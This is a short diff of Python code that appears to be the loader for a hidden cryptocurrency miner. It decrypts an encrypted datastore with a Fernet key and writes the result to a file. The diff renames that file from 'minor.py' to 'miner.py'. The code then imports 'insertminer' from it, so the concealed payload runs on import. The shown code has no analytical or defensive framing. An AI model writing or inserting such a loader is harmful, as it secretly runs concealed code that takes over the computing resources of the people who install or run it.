@@ -9,11 +9,11 @@ datastore = datastore_file.read()
 decryptor = Fernet(key)
 minor = decryptor.decrypt(datastore)
 
-minor_file = open("minor.py", 'w')
+minor_file = open("miner.py", 'w')
 minor_file.write(minor)
 
 minor_file.close()
 key_file.close()
 datastore_file.close()
 
-from .minor import insertminer
+from .miner import insertminer
